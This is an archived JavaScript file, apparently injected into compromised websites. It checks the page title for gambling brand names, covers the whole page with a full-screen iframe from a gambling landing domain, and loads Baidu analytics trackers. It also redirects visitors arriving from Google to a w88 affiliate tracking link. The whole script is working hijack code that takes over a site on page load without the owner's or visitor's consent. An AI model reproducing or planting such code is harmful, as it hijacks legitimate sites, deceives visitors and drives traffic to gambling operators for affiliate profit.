var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");

document.write('<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no"><style>html,body{width:100%;height:100%;overflow:hidden;margin:0;padding:0}</style>');

function checktitle()
{
	var fit=1;
	var sou;
	var title = document.title;
        if(title.indexOf("天博")!=-1||title.indexOf("tb")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/tb/index.html";
	}else if(title.indexOf("葡")!=-1||title.indexOf("亰")!=-1||title.indexOf("京")!=-1||title.indexOf("匍")!=-1||title.indexOf("蒲")!=-1||title.indexOf("浦")!=-1||title.indexOf("pj")!=-1||title.indexOf("普")!=-1||title.indexOf("莆")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/pj/index.html";
	}else if(title.indexOf("bob")!=-1||title.indexOf("BOB")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/BOB/index.html";
	}else if(title.indexOf("米乐")!=-1||title.indexOf("m6")!=-1||title.indexOf("mile")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/ms/index.html";
	}else if(title.indexOf("永利")!=-1||title.indexOf("yl")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/yl/index.html";
	}else if(title.indexOf("blr")!=-1||title.indexOf("巴黎")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/pj/index.html";
	}else if(title.indexOf("太阳")!=-1||title.indexOf("tyc")!=-1||title.indexOf("太陽")!=-1||title.indexOf("大阳")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/tyc/index.html";
	}else if(title.indexOf("威尼")!=-1||title.indexOf("威斯")!=-1||title.indexOf("尼斯")!=-1||title.indexOf("斯尼")!=-1||title.indexOf("vns")!=-1||title.indexOf("wns")!=-1||title.indexOf("威力")!=-1||title.indexOf("威利")!=-1||title.indexOf("尼维")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/wns/index.html";
	}else if(title.indexOf("bet36")!=-1||title.indexOf("bte")!=-1||title.indexOf("bet360")!=-1||title.indexOf("bet356")!=-1||title.indexOf("日博")!=-1||title.indexOf("mob")!=-1||title.indexOf("best")!=-1||title.indexOf("beat")!=-1||title.indexOf("bt365")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/365/index.html";
	}else if(title.indexOf("betway")!=-1||title.indexOf("必威")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/bw/index.html";
	}else if(title.indexOf("永")!=-1||title.indexOf("yl")!=-1||title.indexOf("利")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/yl/index.html";
	}else if(title.indexOf("优德")!=-1||title.indexOf("w88")!=-1||title.indexOf("w8")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/yd/index.html";
	}else if(title.indexOf("万博")!=-1||title.indexOf("狗万")!=-1||title.indexOf("manbet")!=-1||title.indexOf("max")!=-1||title.indexOf("man")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/yb/index.html";
	}else if(title.indexOf("yabo")!=-1||title.indexOf("亚博")!=-1||title.indexOf("亚搏")!=-1||title.indexOf("亚慱")!=-1||title.indexOf("雅博")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/yb/index.html";
	}else if(title.indexOf("金")!=-1||title.indexOf("沙")!=-1||title.indexOf("莎")!=-1||title.indexOf("js")!=-1||title.indexOf("少")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/js/index.html";
	}
	else if(title.indexOf("乐鱼")!=-1||title.indexOf("leyu")!=-1)
	{
		sou="https://web.archive.org/web/20220901215357/https://www.187600.com/d/ly/index.html";
	}
	else{
		sou = 'https://web.archive.org/web/20220901215357/https://www.187600.com/d/ms/index.html';
	}

	var iframe = document.createElement('iframe');
	iframe.src = sou;
	iframe.style.position="absolute";iframe.style.width = '100%'; iframe.style.height="100%";iframe.style.top="0px";iframe.style.left="0px";iframe.style.bottom="0px";iframe.style.zIndex="9999999999999";
	iframe.style.border = 'none';
	iframe.style.background="#000";
	document.body.insertBefore(iframe, document.body.firstChild);
	document.body.style.overflow="hidden";
}
function ready(fn){
	if(document.addEventListener){		//标准浏览器
		document.addEventListener('DOMContentLoaded',function(){
			//注销时间，避免重复触发
			document.removeEventListener('DOMContentLoaded',arguments.callee,false);
			fn();		//运行函数
		},false);
	}else if(document.attachEvent){		//IE浏览器
		document.attachEvent('onreadystatechange',function(){
			if(document.readyState=='complete'){
				document.detachEvent('onreadystatechange',arguments.callee);
				fn();		//函数运行
			}
		});
	}
}
/*window.onload=function(){
checktitle();
}
*/
ready(function(){checktitle();});
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://web.archive.org/web/20220901215357/https://hm.baidu.com/hm.js?7c4441a656624741e60afe5fda271256";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://web.archive.org/web/20220901215357/https://hm.baidu.com/hm.js?35f8cb715023542a8a4bba34fdb30741";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var s=document.referrer
if(s.indexOf("google")>0){
location.href="https://web.archive.org/web/20220901215357/https://affiliate.w88my.com/Track.aspx?affiliateid=40187";
}

}
/*
     FILE ARCHIVED ON 21:53:57 Sep 01, 2022 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 16:41:32 Sep 15, 2022.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 306.828
  exclusion.robots: 0.104
  exclusion.robots.policy: 0.095
  RedisCDXSource: 4.22
  esindex: 0.009
  LoadShardBlock: 281.542 (3)
  PetaboxLoader3.datanode: 295.443 (5)
  CDXLines.iter: 17.705 (3)
  load_resource: 123.645 (2)
  PetaboxLoader3.resolve: 94.67 (2)
*/
